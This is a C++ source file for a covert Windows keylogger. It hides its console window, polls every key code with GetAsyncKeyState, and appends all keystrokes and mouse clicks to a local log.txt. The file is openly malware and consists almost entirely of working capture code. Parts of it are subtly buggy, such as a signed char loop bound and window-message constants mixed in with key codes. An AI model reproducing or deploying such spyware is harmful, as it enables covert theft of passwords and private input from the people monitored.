#include <iostream> // for debug purposes
#include <windows.h> // for Windows API functions

using namespace std;

int Save(int _key, char *file); // _key = key code of the pressed key. *file is a pointer to log.txt.

int main(){
    FreeConsole(); // Conceal keylogger by hiding console
    char i;
    while(true) {
    Sleep(10); // 10 millisecond delay to prevent the program from using too much CPU while waiting for key presses.
        for(i=8; i<=255; i++) { // Iterate through key codes from 8 to 255. These correspond to various keys on a standard keyboard.
            if (GetAsyncKeyState(i)== -32767) { // This is a Windows API function that checks if a key is pressed.
            Save(i, "log.txt"); // Save passed in character 'i' to "log.txt".
            }
        }
    } 
return 0;
}

int Save(int _key, char *file) {
    // cout<< _key << endl; // (console debug line)
    Sleep(10); // 10 millisecond delay to prevent the program from using too much CPU while waiting for key presses.
    FILE *OUTPUT_FILE; // Declares a pointer to "log.txt".
    OUTPUT_FILE = fopen(file, "a+"); // Opens "log.txt" for appending. If file doesn't exist, it will be created.
    switch(_key) { // Compares the value of '_key' to virtual key codes and windows message constants.
/* MODIFIER KEYS */
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); // Shift key
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); // Ctrl key
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); // Alt key (also known as Menu key)
            break;
        case VK_LWIN: fprintf(OUTPUT_FILE, "[LWIN]"); // Left windows key
            break;
        case VK_RWIN: fprintf(OUTPUT_FILE, "[RWIN]"); // Right windows key
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS]"); // Caps lock key
            break;
        case VK_NUMLOCK: fprintf(OUTPUT_FILE, "[NUMLOCK]"); // Num lock key
            break;
        case VK_SCROLL: fprintf(OUTPUT_FILE, "[SCROLL]"); // Scroll lock pressed
            break;
/* FUNCTION KEYS */
        case VK_F1: fprintf(OUTPUT_FILE, "[F1]"); // F1 - F24 keys
            break;
        case VK_F2: fprintf(OUTPUT_FILE, "[F2]");
            break;
        case VK_F3: fprintf(OUTPUT_FILE, "[F3]");
            break;
        case VK_F4: fprintf(OUTPUT_FILE, "[F4]");
            break;
        case VK_F5: fprintf(OUTPUT_FILE, "[F5]");
            break;
        case VK_F6: fprintf(OUTPUT_FILE, "[F6]");
            break;
        case VK_F7: fprintf(OUTPUT_FILE, "[F7]");
            break;
        case VK_F8: fprintf(OUTPUT_FILE, "[F8]");
            break;
        case VK_F9: fprintf(OUTPUT_FILE, "[F9]");
            break;
        case VK_F10: fprintf(OUTPUT_FILE, "[F10]");
            break;
        case VK_F11: fprintf(OUTPUT_FILE, "[F11]");
            break;
        case VK_F12: fprintf(OUTPUT_FILE, "[F12]");
            break;
        case VK_F13: fprintf(OUTPUT_FILE, "[F13]");
            break;
        case VK_F14: fprintf(OUTPUT_FILE, "[F14]");
            break;
        case VK_F15: fprintf(OUTPUT_FILE, "[F15]");
            break;
        case VK_F16: fprintf(OUTPUT_FILE, "[F16]");
            break;
        case VK_F17: fprintf(OUTPUT_FILE, "[F17]");
            break;
        case VK_F18: fprintf(OUTPUT_FILE, "[F18]");
            break;
        case VK_F19: fprintf(OUTPUT_FILE, "[F19]");
            break;
        case VK_F20: fprintf(OUTPUT_FILE, "[F20]");
            break;
        case VK_F21: fprintf(OUTPUT_FILE, "[F21]");
            break;
        case VK_F22: fprintf(OUTPUT_FILE, "[F22]"); 
            break;
        case VK_F23: fprintf(OUTPUT_FILE, "[F23]"); 
            break;
        case VK_F24: fprintf(OUTPUT_FILE, "[F24]");
            break;
/* ARROW KEYS */
        case VK_LEFT: fprintf(OUTPUT_FILE, "[LEFT ARROW]"); // Left arrow key
            break;
        case VK_RIGHT: fprintf(OUTPUT_FILE, "[RIGHT ARROW]"); // Right arrow key
            break;
        case VK_UP: fprintf(OUTPUT_FILE, "[UP ARROW]"); // Up arrow key
            break;
        case VK_DOWN: fprintf(OUTPUT_FILE, "[DOWN ARROW]"); // Down arrow key
            break;
/* OTHER COMMON KEYS */
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); // Backspace
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); // Tab
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); // Enter key
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); // Escape key
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); // Space bar
            break;
        case VK_DELETE: fprintf(OUTPUT_FILE, "[DELETE]"); // Delete key
            break;
        case VK_INSERT: fprintf(OUTPUT_FILE, "[INSERT]"); // Insert key
            break;
        case VK_HOME: fprintf(OUTPUT_FILE, "[HOME]"); // Home key
            break;
        case VK_END: fprintf(OUTPUT_FILE, "[END]"); // End key
            break;
        case VK_PRIOR: fprintf(OUTPUT_FILE, "[PAGE UP]"); // Page Up
            break;
        case VK_NEXT: fprintf(OUTPUT_FILE, "[PAGE DOWN]"); // Page Down
            break;
/* MOUSE VIRTUAL KEY CODES */
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LEFT CLICK]"); // Left mouse button
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RIGHT CLICK]"); // Right mouse button
            break;
        case VK_MBUTTON: fprintf(OUTPUT_FILE, "[MIDDLE MOUSE BUTTON]"); // Middle mouse button
            break;
/* ADDITIONAL CONSTANTS */
        case WM_KEYDOWN: fprintf(OUTPUT_FILE, "[KEY DOWN]"); // Key down
            break;
        case WM_KEYUP: fprintf(OUTPUT_FILE, "[KEY UP]"); // Key up
            break;
        case WM_SYSKEYDOWN: fprintf(OUTPUT_FILE, "[SYSTEM KEY DOWN]"); // System key down
            break;
        case WM_SYSKEYUP: fprintf(OUTPUT_FILE, "[SYSTEM KEY UP]"); // System key up
            break;
        case WM_CHAR: fprintf(OUTPUT_FILE, "[CHARACTER]"); // Character
            break;
        case WM_DEADCHAR: fprintf(OUTPUT_FILE, "[DEAD CHARACTER]"); // Dead character
            break;
        case VK_OEM_1: fprintf(OUTPUT_FILE, ";"); // ;: (US standard)
            break;
        case VK_OEM_PLUS: fprintf(OUTPUT_FILE, "="); // =+
            break;
        case VK_OEM_COMMA: fprintf(OUTPUT_FILE, ","); // ,<
            break;
        case VK_OEM_MINUS: fprintf(OUTPUT_FILE, "-"); // -_
            break;
        case VK_OEM_PERIOD: fprintf(OUTPUT_FILE, "."); // .>
            break;
        case VK_OEM_2: fprintf(OUTPUT_FILE, "/"); // /?
            break;
        case VK_OEM_3: fprintf(OUTPUT_FILE, "`"); // `~
            break;
        case VK_OEM_4: fprintf(OUTPUT_FILE, "["); // [{
            break;
        case VK_OEM_5: fprintf(OUTPUT_FILE, "\\"); // \|
            break;
        case VK_OEM_6: fprintf(OUTPUT_FILE, "]"); // ]}
            break;
        case VK_OEM_7: fprintf(OUTPUT_FILE, "'"); // '"
            break;
    }
    fprintf(OUTPUT_FILE, "%c", _key); // Write the character into "log.txt.".
    fclose(OUTPUT_FILE);
    return 0;
}